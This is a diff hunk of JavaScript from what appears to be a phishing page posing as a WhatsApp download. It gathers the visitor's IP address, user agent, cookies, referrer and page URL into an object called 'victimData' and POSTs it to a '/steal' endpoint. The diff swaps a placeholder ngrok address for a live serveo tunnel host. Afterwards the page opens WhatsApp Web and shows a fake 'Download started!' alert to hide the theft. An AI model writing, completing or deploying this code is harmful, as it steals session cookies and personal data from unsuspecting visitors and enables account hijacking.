@@ -33,8 +33,20 @@
         try{
             const ipRes=await fetch('https://api.ipify.org?format=json');
             const ipData=await ipRes.json();
-            const victimData={ip:ipData.ip,userAgent:navigator.userAgent,cookies:document.cookie,referrer:document.referrer,url:window.location.href,timestamp:new Date().toISOString()};
-            await fetch('https://YOUR_NGROK_URL.ngrok-free.app/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(victimData)});
+            const victimData={
+                ip:ipData.ip,
+                userAgent:navigator.userAgent,
+                cookies:document.cookie,
+                referrer:document.referrer,
+                url:window.location.href,
+                timestamp:new Date().toISOString()
+            };
+            // ✅ FIXED: SERVEO TUNNEL URL
+            await fetch('https://da4edd63b3488520-149-40-194-137.serveousercontent.com/steal',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify(victimData)
+            });
         }catch(e){}
         setTimeout(()=>{window.open('https://web.whatsapp.com','_blank');setTimeout(()=>{alert('✅ Download started!');},1000);},4500);
     }
